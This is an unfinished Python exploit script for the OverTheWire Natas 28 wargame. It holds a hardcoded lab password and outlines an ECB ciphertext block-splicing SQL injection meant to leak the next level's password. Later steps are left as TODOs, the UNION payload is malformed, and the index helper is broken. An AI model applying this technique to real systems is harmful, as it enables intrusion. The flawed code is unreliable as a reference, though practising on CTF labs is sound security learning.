import requests
import base64
from urllib.parse import quote, unquote
from rich.console import Console

# Target credentials and URL
URL = "http://natas28.natas.labs.overthewire.org/index.php"
AUTH = ('natas28', 'Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3')

BLOCK_SIZE = 16


console = Console()
fucked = False # something is fucked

def initialize_session():
    sesh = requests.Session()
    sesh.auth = AUTH
    console.print(f"[green][!][/green] Started session with {sesh.auth}")
    return sesh

def get_raw_ciphertext(input_str : str, session: requests.Session):
    """
    Helper function to send a search query and return the RAW BINARY 
    ciphertext bytes (decoding from URL and Base64 encoding).
    """
    response = session.post(URL, data={'query': input_str}, auth=AUTH)
    
    # Extract the encrypted query string from the redirected response URL
    if 'query=' in response.url:
        encoded_ct = response.url.split('query=')[1]
        raw_bytes = base64.b64decode(unquote(encoded_ct))
        return raw_bytes
    else:
        console.print("[bold red][!] Error: Could not extract query parameter from response.[/]")
        return None

def compute_padding_length(session: requests.Session):
    global fucked
    test_string = ""
    raw_bytes = get_raw_ciphertext(input_str=test_string, session=session)
    if raw_bytes is not None:
        initial_length = len(raw_bytes)
        console.print(f"Initial length of raw binary ciphertext is {initial_length}")
    
    length = 0
    while (length != initial_length + 16):
        test_string += "A"
        raw_bytes = get_raw_ciphertext(input_str = test_string, session = session)
        if raw_bytes is not None:
            length = len(raw_bytes)
        if len(test_string) > 300:
            fucked = True
            break
    
    if fucked:
        console.print("[bold red] String got over 100 characters with no change .. Aborting[/]")
        return None

    padding_length = len(test_string) - 1

    return padding_length

def compute_user_input_indices(padding_length: int,session: requests.Session):
    raw_bytes_null = get_raw_ciphertext(input_str="", session = session)
    raw_bytes_one = get_raw_ciphertext(input_str="", session = session)

    if raw_bytes_null is None or raw_bytes_one is None:
        console.print("[bold red] Error in getting server response... returning")
        return 0, 0

    start_idx = 0
    min_len = min(len(raw_bytes_null), len(raw_bytes_one))
    while start_idx < min_len and raw_bytes_null[start_idx] == raw_bytes_one[start_idx]:
        start_idx += 1

    end_idx = len(raw_bytes_null) - padding_length

    return start_idx, end_idx

def send_spliced_ciphertext(raw_bytes, session: requests.Session):
    """
    Helper function to re-encode spliced raw ciphertext bytes back into 
    URL/Base64 format and send it to the server to trigger the SQL injection.
    """
    b64_ct = base64.b64encode(raw_bytes).decode('utf-8')
    url_encoded_ct = quote(b64_ct)
    
    target_url = f"{URL}?query={url_encoded_ct}"
    response = session.get(target_url, auth=AUTH)
    return response.text

def main():
    console.print("[bold][*] Starting Natas 28 Exploit Script...[/bold]")
    with console.status("[bold]Natas28 Exploit Script...[/bold]", spinner = "dots"):
        sesh = initialize_session()
    
        # =========================================================================
        # STEP 1: CALCULATE THE PREFIX OFFSET
        # -------------------------------------------------------------------------
        # Main Idea: 
        # Send inputs of increasing length (e.g., 'A'*1, 'A'*2, 'A'*3...) until 
        # the total ciphertext byte length increases by 16 bytes.
        # This reveals how many padding characters are needed to completely fill 
        # the server's static prefix block and align your input to a fresh block boundary.
        # =========================================================================
        
        # TODO: Determine prefix_padding_len
        console.print("Computing the prefix padding length...")
        prefix_padding_len = compute_padding_length(sesh)  # <--- Replace with calculated padding length
        if prefix_padding_len is None:
            return 0
        else:
            console.print(f"[green][!][italic]Final padding length[/][/] recovered is {prefix_padding_len}")
        # =========================================================================
        # STEP 2: CRAFT AND HARVEST THE ENCRYPTED PAYLOAD BLOCK
        # -------------------------------------------------------------------------
        # Main Idea:
        # Construct a query string:
        #   [Prefix Padding] + [SQL Injection Payload] + [Suffix Padding]
        #
        # Send this to the server and extract ONLY the 16-byte block(s) that 
        # contain your encrypted SQL payload.
        # =========================================================================
        
        # TODO: Define your target SQL payload (e.g., ' UNION SELECT ... -- ')
        sql_payload = " ' UNION SELECT * WHERE user = 'natas28' " 
        
        # TODO: Pad the payload so it fills an exact multiple of 16 bytes
        crafted_input = "A" * prefix_padding_len + sql_payload

        start_idx, end_idx = compute_user_input_indices(prefix_padding_len, sesh)
        
        # raw_ct_A = get_raw_ciphertext(crafted_input)
        # TODO: Slice out the exact 16-byte block corresponding to your payload
        # payload_block = raw_ct_A[start_idx : end_idx]


        # =========================================================================
        # STEP 3: SPLICE THE PAYLOAD INTO A BASELINE CIPHERTEXT
        # -------------------------------------------------------------------------
        # Main Idea:
        # Obtain a normal ciphertext string (Request B). Splice your harvested 
        # encrypted payload block into the raw bytes where the backend expects 
        # search parameter data.
        # =========================================================================
        
        # baseline_ct = get_raw_ciphertext("benign_search_term")
        # TODO: Reconstruct the raw byte array:
        # spliced_bytes = baseline_prefix_blocks + payload_block + baseline_suffix_blocks


        # =========================================================================
        # STEP 4: EXECUTE THE INJECTION & READ THE PASSWORD
        # -------------------------------------------------------------------------
        # Main Idea:
        # Send the modified, re-encoded ciphertext back to the server and parse 
        # the HTML response for the leaked natas29 password.
        # =========================================================================
        
        # result_html = send_spliced_ciphertext(spliced_bytes)
        # print(result_html)

if __name__ == "__main__":
    main()